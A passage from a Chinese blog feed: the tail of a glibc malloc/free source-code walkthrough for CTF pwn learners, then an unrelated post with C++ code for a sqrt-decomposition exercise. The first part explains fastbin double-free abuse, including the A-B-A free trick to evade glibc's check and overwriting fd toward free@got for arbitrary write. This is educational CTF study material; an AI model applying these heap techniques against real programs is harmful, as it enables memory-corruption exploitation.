shell</code>了。这里可以看到，<code>free@got</code>这个指针我是能任意编辑的，也就是说我想申请到哪都不是问题，这样我就能任意地址写了。</p><p>你可能有点疑问，我<code>free</code>了2个堆块，怎么出来3个堆块。那我们想想，如果遍历一个单链表，你怎么判断结尾？咱们一般都是判断<code>x-&gt;next!=NULL</code>但是原来那边A的<code>next</code>指针确实是<code>NULL</code>，但是你把指针改过了，就会认为<code>fast bin</code>还没有空。</p><p>但是实际情况往往没有那么简单，前面我们说过了，<code>malloc</code>取出一个<code>fast bin</code>的<code>chunk</code>的时候，会判断它<code>chunk</code>的<code>size</code>是否等于当前我要申请的<code>size</code>，如果不是就会报错退出。所以<code>double free</code>在利用的时候还是没那么”任意”的，而且这里也不允许你直接<code>double free</code>，但是直接不能不代表不能间接<code>double free</code>，如果我先<code>free</code>一个A，<code>free</code>一个B之后再<code>free</code>一个A，那么我再申请到A的时候修改A的指针域一样可以劫持，并且可以绕过这里的检测。</p><p>然后如果过了检测，那就将这个<code>chunk</code>假如<code>fast bin</code>的顶部。这里就是一个单链表的插入，具体自己写的话应该是这样</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">p-&gt;fd=av-&gt;fastbinY[index]-&gt;fd;</span><br><span class="line">av-&gt;fastbinY[index]-&gt;fd=p;</span><br></pre></td></tr></table></figure><p>源码中与这个略微有点不一样，效果是一样的。所以也可以看出来这个是后进先出，只在<code>fast bin</code>的一端插入删除，跟栈差不多。</p><p>末尾还有一个<code>check</code>，但是这个<code>check</code>通常不会被触发，有会的师傅也请帮帮，因为是真的不知道hhh。</p><h4 id="free非fast-bin"><a href="#free非fast-bin" class="headerlink" title="free非fast bin"></a>free非fast bin</h4><p>这里分了两种情况，如果<code>chunk</code>是<code>mmap</code>分配的话那就调用<code>munmap_chunk</code>函数去<code>free</code>这个<code>chunk</code>，这个情况不属于我们主要要分析的内容，所以那边的else分支我们跳过，只分析非<code>mmap</code>分配的<code>chunk</code>。</p><h4 id="第一部分：锁"><a href="#第一部分：锁" class="headerlink" title="第一部分：锁"></a>第一部分：锁</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (! have_lock) &#123;</span><br><span class="line">    (<span class="keyword">void</span>)mutex_lock(&amp;av-&gt;mutex);</span><br><span class="line">    locked = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">......</span><br><span class="line"><span class="keyword">if</span> (! have_lock) &#123;</span><br><span class="line">    assert (locked);</span><br><span class="line">    (<span class="keyword">void</span>)mutex_unlock(&amp;av-&gt;mutex);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这我熟，就是在用一个分配器的时候先加锁，用完了释放就行了。这主要是为了防止多个线程之间发生竞争，虽然我看过多线程是说有独立的堆空间，但是假设堆块正常使用，正常分配，不去做指针的越界操作，那么同一个分配器分配给不同的线程用也是完全可行的，我只拿到我自己用的指针在合法范围内用一样不会造成竞争的现象。以上出于我自己的大胆推测，如有不对还请指正。</p><h4 id="第二部分：free之前的各种check"><a href="#第二部分：free之前的各种check" class="headerlink" title="第二部分：free之前的各种check"></a>第二部分：free之前的各种check</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NONCONTIGUOUS_BIT     (2U)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> contiguous(M)          (((M)-&gt;flags &amp; NONCONTIGUOUS_BIT) == 0)</span></span><br><span class="line"></span><br><span class="line">nextchunk = chunk_at_offset(p, size);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Lightweight tests: check whether the block is already the</span></span><br><span class="line"><span class="comment">       top block.  */</span></span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (p == av-&gt;top))</span><br><span class="line">&#123;</span><br><span class="line">    errstr = <span class="string">&quot;double free or corruption (top)&quot;</span>;</span><br><span class="line">    <span class="keyword">goto</span> errout;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* Or whether the next chunk is beyond the boundaries of the arena.  */</span></span><br><span class="line"><span class="keyword">if</span> (__builtin_expect (contiguous (av)</span><br><span class="line">                      &amp;&amp; (<span class="keyword">char</span> *) nextchunk</span><br><span class="line">                      &gt;= ((<span class="keyword">char</span> *) av-&gt;top + chunksize(av-&gt;top)), <span class="number">0</span>))</span><br><span class="line">&#123;</span><br><span class="line">    errstr = <span class="string">&quot;double free or corruption (out)&quot;</span>;</span><br><span class="line">    <span class="keyword">goto</span> errout;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* Or whether the block is actually not marked used.  */</span></span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (!prev_inuse(nextchunk)))<span class="comment">//后面块的prev in use标志位为0时发生free</span></span><br><span class="line">&#123;</span><br><span class="line">    errstr = <span class="string">&quot;double free or corruption (!prev)&quot;</span>;</span><br><span class="line">    <span class="keyword">goto</span> errout;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">nextsize = chunksize(nextchunk);</span><br><span class="line"><span class="keyword">if</span> (__builtin_expect (nextchunk-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>)</span><br><span class="line">    || __builtin_expect (nextsize &gt;= av-&gt;system_mem, <span class="number">0</span>))</span><br><span class="line">&#123;</span><br><span class="line">    errstr = <span class="string">&quot;free(): invalid next size (normal)&quot;</span>;</span><br><span class="line">    <span class="keyword">goto</span> errout;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">free_perturb (chunk2mem(p), size - <span class="number">2</span> * SIZE_SZ);</span><br></pre></td></tr></table></figure><p>好，我们来看第一个<code>check</code>。</p><ol><li><code>p == av-&gt;top</code>：<code>free</code>的<code>chunk</code>为<code>top_chunk</code>。</li></ol><p><code>top_chunk</code>和其它<code>bin</code>一样，都是出于待分配状态，<code>top_chunk</code>永远不会被使用。因为如果切割了<code>top_chunk</code>，<code>top_chunk</code>马上会下移，所以正常分配是绝对不会分配到现在的<code>top_chunk</code>指针的，所以当你尝试<code>free</code> <code>top_chunk</code>的时候，就会报这个错。</p><p>第二个<code>check</code></p><ol><li><code>contiguous (av)</code>：检查分配器上的<code>flags</code>，其实我也不知道是干嘛的(捂脸。</li><li><code>(char *) nextchunk&gt;=(char *) av-&gt;top + chunksize(av-&gt;top)</code>：然后这个条件呢就是说如果我这个<code>chunk</code>的下一个<code>chunk</code>居然在<code>top_chunk</code>之后，那肯定就也有错了。</li></ol><p>第三个<code>check</code></p><ol><li><code>!prev_inuse(nextchunk)</code>：就是说如果后一个<code>chunk</code>的<code>prev_inuse</code>为0，也就是说这个<code>chunk</code>处于被<code>free</code>的状态，那么这一次<code>free</code>就有可能造成<code>double free</code>了，就会报错。</li></ol><p>第四个<code>check</code></p><ol><li><code>nextchunk-&gt;size &lt;= 2 * SIZE_SZ</code>：如果下一个<code>chunk</code>的<code>size</code>有问题一样也要报错退出，这里说的就是下一个<code>chunk</code>的<code>size</code>小于<code>MINSIZE</code>的情况，free的话因为会涉及到chunk的向前合并或者向后合并，因此对前后堆块的检查都很严格。</li><li><code>nextsize &gt;= av-&gt;system_mem</code>：<code>size</code>超出系统分配给分配器的内存，那也报错。</li></ol><h4 id="第三部分：free之后向前合并"><a href="#第三部分：free之后向前合并" class="headerlink" title="第三部分：free之后向前合并"></a>第三部分：free之后向前合并</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* consolidate backward */</span></span><br><span class="line"><span class="keyword">if</span> (!prev_inuse(p)) &#123;</span><br><span class="line">    prevsize = p-&gt;prev_size;</span><br><span class="line">    size += prevsize;</span><br><span class="line">    p = chunk_at_offset(p, -((<span class="keyword">long</span>) prevsize));</span><br><span class="line">    unlink(av, p, bck, fwd);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里就提到了我们之前讲到的一个问题，我一个堆块怎么向前合并，也就是如何准确地找到前一个堆块。向前合并的时候我先判断一下前一个<code>chunk</code>是否被使用，如果不被使用那么就要和前面的<code>chunk</code>合并。这里我就可以通过<code>prev_size</code>位去找到这个堆块，用自身指针减去<code>prev_size</code>就得到了前一个<code>chunk</code>的指针。</p><p>这里需要注意，因为前面那个<code>chunk</code>可能在<code>large bin</code>,<code>small bin</code>或者是<code>unsorted bin</code>的链表当中，那么我就得先把它从这些<code>bin</code>里面解脱出来，也就是<code>unlink</code>操作，合并之后成为一个新的<code>chunk</code>然后再加入<code>unsorted bin</code>。</p><p>这里向前合并的操作呢应该也没有很复杂，就是改个<code>size</code>然后把<code>free</code>的指针指到前面去，相当于是要<code>free</code>合并后的<code>chunk</code>了。然后<code>unlink</code>把前面的<code>chunk</code>在<code>bin</code>中删除。</p><h4 id="第四部分：free之后向后合并"><a href="#第四部分：free之后向后合并" class="headerlink" title="第四部分：free之后向后合并"></a>第四部分：free之后向后合并</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">if</span> (nextchunk != av-&gt;top) &#123;</span><br><span class="line">    <span class="comment">/* get and clear inuse bit */</span></span><br><span class="line">    nextinuse = inuse_bit_at_offset(nextchunk, nextsize);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* consolidate forward */</span></span><br><span class="line">    <span class="keyword">if</span> (!nextinuse) &#123;</span><br><span class="line">        unlink(av, nextchunk, bck, fwd);</span><br><span class="line">        size += nextsize;</span><br><span class="line">    &#125; <span class="keyword">else</span></span><br><span class="line">        clear_inuse_bit_at_offset(nextchunk, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">Place the chunk in unsorted chunk list. Chunks are</span></span><br><span class="line"><span class="comment">not placed into regular bins until after they have</span></span><br><span class="line"><span class="comment">been given one chance to be used in malloc.</span></span><br><span class="line"><span class="comment">      */</span></span><br><span class="line"></span><br><span class="line">    bck = unsorted_chunks(av);</span><br><span class="line">    fwd = bck-&gt;fd;</span><br><span class="line">    <span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk != bck))</span><br><span class="line">    &#123;</span><br><span class="line">        errstr = <span class="string">&quot;free(): corrupted unsorted chunks&quot;</span>;</span><br><span class="line">        <span class="keyword">goto</span> errout;</span><br><span class="line">    &#125;</span><br><span class="line">    p-&gt;fd = fwd;</span><br><span class="line">    p-&gt;bk = bck;</span><br><span class="line">    <span class="keyword">if</span> (!in_smallbin_range(size))</span><br><span class="line">    &#123;</span><br><span class="line">        p-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">        p-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    bck-&gt;fd = p;</span><br><span class="line">    fwd-&gt;bk = p;</span><br><span class="line"></span><br><span class="line">    set_head(p, size | PREV_INUSE);</span><br><span class="line">    set_foot(p, size);</span><br><span class="line">    check_free_chunk(av, p);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">      If the chunk borders the current high end of memory,</span></span><br><span class="line"><span class="comment">      consolidate into top</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    size += nextsize;</span><br><span class="line">    set_head(p, size | PREV_INUSE);</span><br><span class="line">    av-&gt;top = p;</span><br><span class="line">    check_chunk(av, p);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里有一个特判后面的<code>chunk</code>是否为<code>top_chunk</code>，<code>top_chunk</code>的情况就非常简单，因为合并的<code>chunk</code>并不在任何<code>bin</code>里面，<code>top_chunk</code>后面也没有堆块不需要设置标志位。只需要改一下<code>top_chunk</code>的<code>size</code>，然后改一下指针，就完了。</p><p>那么我们分析不是<code>top_chunk</code>的情况，首先我先获取一下下一个<code>chunk</code>的是否被使用，如果没有被使用，那么把后面的<code>chunk</code>就先<code>unlink</code>了，然后自己<code>chunk</code>的<code>size</code>加上后面那个<code>chunk</code>的<code>size</code>成为新的<code>chunk</code>。否则，我就直接清空后面<code>chunk</code>的<code>prev_inuse</code>位，就是表示我这个<code>chunk</code>已经不被使用了。好了之后那就是把这个<code>chunk</code>链入<code>unsorted bin</code>。这里还有一个<code>check</code>，跟<code>malloc</code>那个一样，，后面基本也都一样了，就不细讲了，链入，设置标记为，设置<code>prev_size</code>，如果不在<code>small chunk</code>的大小还会清空<code>fd_nextsize</code>和<code>bk_nextsize</code>指针，如果不理解可以往上翻一下看看。目录标题为“最后一小块”，那边是切割<code>bin</code>的时候设置的。</p><h4 id="第五部分：最后的处理"><a href="#第五部分：最后的处理" class="headerlink" title="第五部分：最后的处理"></a>第五部分：最后的处理</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FASTBIN_CONSOLIDATION_THRESHOLD  (65536UL)</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">      If freeing a large space, consolidate possibly-surrounding</span></span><br><span class="line"><span class="comment">      chunks. Then, if the total unused topmost memory exceeds trim</span></span><br><span class="line"><span class="comment">      threshold, ask malloc_trim to reduce top.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">      Unless max_fast is 0, we don&#x27;t know if there are fastbins</span></span><br><span class="line"><span class="comment">      bordering top, so we cannot tell for sure whether threshold</span></span><br><span class="line"><span class="comment">      has been reached unless fastbins are consolidated.  But we</span></span><br><span class="line"><span class="comment">      don&#x27;t want to consolidate on each free.  As a compromise,</span></span><br><span class="line"><span class="comment">      consolidation is performed if FASTBIN_CONSOLIDATION_THRESHOLD</span></span><br><span class="line"><span class="comment">      is reached.</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>)(size) &gt;= FASTBIN_CONSOLIDATION_THRESHOLD) &#123;</span><br><span class="line">    <span class="keyword">if</span> (have_fastchunks(av))</span><br><span class="line">        malloc_consolidate(av);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (av == &amp;main_arena) &#123;</span><br><span class="line">        <span class="meta">#<span class="meta-keyword">ifndef</span> MORECORE_CANNOT_TRIM</span></span><br><span class="line">        <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>)(chunksize(av-&gt;top)) &gt;=</span><br><span class="line">            (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(mp_.trim_threshold))</span><br><span class="line">            systrim(mp_.top_pad, av);</span><br><span class="line">        <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">/* Always try heap_trim(), even if the top chunk is not</span></span><br><span class="line"><span class="comment">   large, because the corresponding heap might go away.  */</span></span><br><span class="line">        heap_info *heap = heap_for_ptr(top(av));</span><br><span class="line"></span><br><span class="line">        assert(heap-&gt;ar_ptr == av);</span><br><span class="line">        heap_trim(heap, mp_.top_pad);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如注释所说，如果我一次释放了一个很大的空间(<code>0x10000B</code>)，那么会调用<code>malloc_consolidate</code>合并所有<code>fast bin</code>，如果进程所在的分配区是主分配区并且可以收缩内存的话，就调用<code>systrim</code>收缩内存，否则就获得非主分配区的<code>heap_info</code>指针，调用<code>heap_trim</code>收缩<code>heap</code>。因为我们认为一次<code>free</code>很大的空间那么操作系统可以适当回收点内存了，大不了等你不够就再像我要嘛，资源的合理配置，很合理。</p><p>至此，<code>free</code>部分的源码也都分析完啦。</p><h3 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h3><p>就不向<code>malloc</code>一样描述具体步骤了，因为本身逻辑没有很复杂。主要就是<code>free</code>非<code>fast bin chunk</code>的向前合并或者向后合并。</p><p><code>free</code>在<code>fast bin</code>范围内的<code>chunk</code>，直接将<code>chunk</code>链入<code>fast bin</code>，<code>free</code>非<code>fast bin</code>范围的<code>chunk</code>视具体情况向前合并或者向后合并然后加入<code>unsorted bin</code>，如果一次<code>free</code>太多的空间有可能会被操作系统回收。</p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>源码分析也就完结撒花了，后续可能会出heap的各种利用方式和利用手段，或者局部分析其它版本的libc。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;学了这么久堆漏洞了，我想应该把&lt;code&gt;glibc&lt;/code&gt;的&lt;code&gt;malloc&lt;/code&gt;和&lt;code&gt;free&lt;/code&gt;源码解析写一下了，希望能帮助一下刚上路的师傅，同时也巩固一下自身知识。&lt;/p&gt;</summary>
    
    
    
    <category term="ctf" scheme="http://example.com/categories/ctf/"/>
    
    <category term="pwn" scheme="http://example.com/categories/ctf/pwn/"/>
    
    
  </entry>
  
  <entry>
    <title>分块入门2</title>
    <link href="http://example.com/2021/12/23/%E5%88%86%E5%9D%97%E5%85%A5%E9%97%A82/"/>
    <id>http://example.com/2021/12/23/%E5%88%86%E5%9D%97%E5%85%A5%E9%97%A82/</id>
    <published>2021-12-22T19:00:00.000Z</published>
    <updated>2021-12-22T19:20:26.935Z</updated>
    
    <content type="html"><![CDATA[<p>谨以此文，纪念我逝去的这6个小时。原本昨天开开心心学学分块，但是入门2就卡住了，卡到生活都不能自理了。</p><span id="more"></span><h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><p><img src="/2021/12/23/%E5%88%86%E5%9D%97%E5%85%A5%E9%97%A82/1.png" alt="1"></p><p>题目意思还是很清晰的。要求区间加法，区间查询符合条件的值。至于加法完全可以照搬前一道题目的方式，但是查询的操作着实有点耐人寻味了，因为区间查询意味着我们得采用分块的思想，不能暴力求解。首先我想到让每一个块变得有序，然后lower_bound查到第一个大于等于某个值的第一个元素的位置。首先对所有块排序的复杂度为√n * √n log_2(√n)也就是nlog_2(n)的复杂度，然后每一次查询最多是√n的复杂度，每一次区间加法是√n的复杂度，区间加法还要对固定两个残缺块进行重新排序(因为两边的残缺块可能会破坏有序结构，而中间的则会保持原来的顺序)，这又需要2√nlog_2(√n)的复杂度。查询和加法一起是n√n的复杂度，所以整个算法就是n√n的复杂度，理论可行但是实践可惨死了。</p><p>首先，序列排序直接破坏了它的序列结构，这导致我在前一天20点-24点的提交一直不通过。后来我意识到了不能破坏它原有的序列，于是想到每个块用一个vector去保存。更新的时候clear再一个个push然后一个sort即可。然后又不行，发现是边界问题，因为我过于追求极限，因此会判断两边的块是否为完整块，完整则一起处理，不完整则先处理，这样导致如果没有处理，那么下面的循环条件没注意就不会被处理了。所以最好的方法就是，不管它，l那个点所在的块我就先处理，管你玩不完整的，右边的r也一样。</p><p>处理完了这个之后，我又被90分卡住了，最后发现是最后一个不完整的块它没有预先排序，但是其实是要的，虽然我也不知道为什么，因为我当时是感觉，它不可能会被当成一个完整的块，就基本没去管它了。但是事实就是这么魔幻：不管我就不让你过，就搞你心态。</p><p>然后来看看孩子的提交记录吧。</p><p><img src="/2021/12/23/%E5%88%86%E5%9D%97%E5%85%A5%E9%97%A82/2.png" alt="2"></p><p>真的是太不容易了，下面给出我的AC代码。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 50005</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">int</span> a[maxn],bl[maxn],tag[maxn],block,n;</span><br><span class="line">vector&lt;<span class="keyword">int</span>&gt;v[maxn];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">update</span><span class="params">(<span class="keyword">int</span> x)</span></span>&#123;</span><br><span class="line">    v[x].<span class="built_in">clear</span>();</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=x*block;i&lt;<span class="built_in">min</span>((x+<span class="number">1</span>)*block,n);i++)&#123;</span><br><span class="line">        v[x].<span class="built_in">push_back</span>(a[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">sort</span>(v[x].<span class="built_in">begin</span>(),v[x].<span class="built_in">end</span>());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> l,<span class="keyword">int</span> r,<span class="keyword">int</span> c)</span></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=l;i&lt;=<span class="built_in">min</span>(bl[l]*block+block<span class="number">-1</span>,r);i++)&#123;</span><br><span class="line">        a[i]+=c;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">update</span>(bl[l]);</span><br><span class="line">    <span class="keyword">if</span>(bl[l]==bl[r])<span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=bl[r]*block;i&lt;=r;i++)&#123;</span><br><span class="line">        a[i]+=c;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">update</span>(bl[r]);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=bl[l]+<span class="number">1</span>;i&lt;bl[r];i++)&#123;</span><br><span class="line">        tag[i]+=c;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">query</span><span class="params">(<span class="keyword">int</span> l,<span class="keyword">int</span> r,<span class="keyword">int</span> num)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> ans=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=l;i&lt;=<span class="built_in">min</span>(bl[l]*block+block<span class="number">-1</span>,r);i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(a[i]+tag[bl[i]]&lt;num)&#123;</span><br><span class="line">            ans++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(bl[l]==bl[r])<span class="keyword">return</span> ans;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=bl[r]*block;i&lt;=r;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(a[i]+tag[bl[i]]&lt;num)&#123;</span><br><span class="line">            ans++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=bl[l]+<span class="number">1</span>;i&lt;bl[r];i++)&#123;</span><br><span class="line">        <span class="keyword">int</span> k=<span class="built_in">lower_bound</span>(v[i].<span class="built_in">begin</span>(),v[i].<span class="built_in">end</span>(),num-tag[i])-v[i].<span class="built_in">begin</span>();</span><br><span class="line">        <span class="keyword">if</span>(k&gt;<span class="number">0</span>)ans+=k;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">    cin&gt;&gt;n;</span><br><span class="line">    <span class="keyword">int</span> q=n;</span><br><span class="line">    block=<span class="built_in">sqrt</span>(n);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">        cin&gt;&gt;a[i];</span><br><span class="line">        bl[i]=i/block;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;bl[n<span class="number">-1</span>];i++)&#123;</span><br><span class="line">        <span class="built_in">update</span>(i);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(q--)&#123;</span><br><span class="line">        <span class="keyword">int</span> opt,l,r,c;</span><br><span class="line">        cin&gt;&gt;opt&gt;&gt;l&gt;&gt;r&gt;&gt;c;</span><br><span class="line">        l--,r--;</span><br><span class="line">        <span class="keyword">if</span>(opt==<span class="number">0</span>)<span class="built_in">add</span>(l,r,c);</span><br><span class="line">        <span class="keyword">else</span> cout&lt;&lt;<span class="built_in">query</span>(l,r,c*c)&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">   </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;谨以此文，纪念我逝去的这6个小时。原本昨天开开心心学学分块，但是入门2就卡住了，卡到生活都不能自理了。&lt;/p&gt;</summary>
    
    
    
    <category term="icpc" scheme="http://example.com/categories/icpc/"/>
    
    <category term="algorithm" scheme="http://example.com/categories/icpc/algorithm/"/>
    
